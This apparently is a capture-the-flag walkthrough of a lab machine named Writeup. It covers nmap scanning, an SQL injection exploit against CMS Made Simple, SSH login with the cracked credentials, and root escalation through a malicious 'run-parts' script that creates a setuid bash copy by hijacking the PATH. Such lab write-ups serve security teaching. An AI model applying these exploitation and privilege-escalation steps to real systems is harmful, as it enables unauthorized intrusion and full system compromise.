## Writeup


| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.138 |
|Difficulty |    Easy   |


## Scanning

### Nmap scanning

```bash
$ nmap -sC -sV   -oA nmap/writeup   10.10.10.138
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 14:15 EDT
Nmap scan report for 10.10.10.138
Host is up (0.098s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
```


## Enumeration

__Website TCP:80__

- Homepage

![homepage](images/homepage.PNG)

![Writeup](images/writeup.PNG)

![cms_made_simple](images/cms_made_simple.PNG)

- Using searchsploit to find the exploits, resulted few..

```bash
$ searchsploit cms made simple
------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                             |  Path
------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                         | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                                    | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                                    | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                                 | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                                     | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                    | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                          | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                                | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                       | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                           | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                               | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                              | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                        | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                           | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                           | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                              | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                    | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                             | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                           | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                              | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                             | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                               | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                   | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                               | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                   | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                              | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                              | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                            | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                   | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                           | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                      | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                             | php/webapps/46546.py
```

- Finding the version.
- Visit the homepage of `cms made simple` ->  `downloads` [Here](http://www.cmsmadesimple.org/downloads/cmsms). then  find the link text for current version repo.

![svn](images/svn.PNG)

- open the link in the browser to see  the directyory structure.

![svn_directory](images/svn_directory.PNG)

- After enumerating, version details can be found in `/doc/CHANGELOG.txt`

- Now navigate to the victim site and locate the `CHANGELOG.txt` file. `/doc/CHANGELOG.txt`

__Result__

![version](images/version.PNG)


## Exploitation 

- The possible exploit is `sql injection` (from `searchsploit` results)

- Download the exploit and run.

```bash
$ python3 sql_cms.py  -u http://10.10.10.138/writeup  
```

![creds](images/creds.PNG)

- Decrypting the password

![decrypted](images/decrypted.PNG)


- log in to `ssh` with found `creds`

```bash
$ ssh jkr@10.10.10.138 
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev
```



## Privilege escalation

![linpeas](images/linpeas.PNG)

- User belongs to `staff` group.

>staff: Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may "override" the executables in /bin and /usr/bin with the same name). Compare with group "adm", which is more related to monitoring/security.

- We can use `pspy` (process spy) to spy on processes.

<hr>

- pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

- The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.

<hr>

and then look for relative path binaries and place them in `/usr/bin` dierectory (look for $PATH) to find where it can be placed.



- Running the `pspy`

```bash
jkr@writeup:/tmp$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/09/24 16:13:17 CMD: UID=0    PID=9      | 
2021/09/24 16:13:17 CMD: UID=0    PID=85     | 
2021/09/24 16:13:17 CMD: UID=0    PID=8      | 
2021/09/24 16:13:17 CMD: UID=0    PID=78     | 
2021/09/24 16:13:17 CMD: UID=0    PID=77     | 
2021/09/24 16:13:17 CMD: UID=0    PID=76     | 
...
...
...


2021/09/24 16:14:01 CMD: UID=0    PID=2058   | /usr/sbin/cron 
2021/09/24 16:14:01 CMD: UID=0    PID=2059   | /usr/sbin/CRON 
2021/09/24 16:14:01 CMD: UID=0    PID=2060   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>

...
```


- We can initiate `ssh` login to see for any more processes that run with `relative paths`.

-  Login with ssh again 

- `pspy` output when logged in with `ssh`

```bash
2021/09/24 16:15:44 CMD: UID=0    PID=2075   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/09/24 16:15:44 CMD: UID=0    PID=2076   | run-parts --lsbsysinit /etc/update-motd.d 
2021/09/24 16:15:44 CMD: UID=0    PID=2077   | uname -rnsom 
2021/09/24 16:15:44 CMD: UID=0    PID=2078   | sshd: jkr [priv]  
```

- We can see that `run-parts` is being called with `relative path`, we can create a malicious binary and place it in `/usr/local/bin`

```bash
jkr@writeup:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```


- Maliciopus binary (`run-parts`)

```
#!/bin/bash

cp /bin/bash /tmp/
chmod 7777 /tmp/bash
```

- copy to `/usr/local/bin`

```bash
jkr@writeup:/tmp$ cp run-parts /usr/local/bin/
```

- initiate `ssh` login

__Result__

```bash
jkr@writeup:/tmp$ ls -la
total 5176
drwxrwxrwt  3 root root    4096 Sep 24 16:23 .
drwxr-xr-x 22 root root    4096 Apr 19  2019 ..
-rwsrwsrwt  1 root root 1099016 Sep 24 16:22 bash
-rwxr-xr-x  1 jkr  jkr  1099016 Sep 24 16:20 mybash
-rwxr-xr-x  1 jkr  jkr  3078592 Aug 22  2019 pspy64
-rwxr-xr-x  1 jkr  jkr       53 Sep 24 16:21 run-parts
drwx------  2 root root    4096 Sep 24 16:10 vmware-root
```

- Run `bash` in tmp using `-p` for privileged mode


```bash
jkr@writeup:/tmp$ ./bash -p
bash-4.4# id
uid=1000(jkr) gid=1000(jkr) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev),1000(jkr)
```

- `euid` is `root`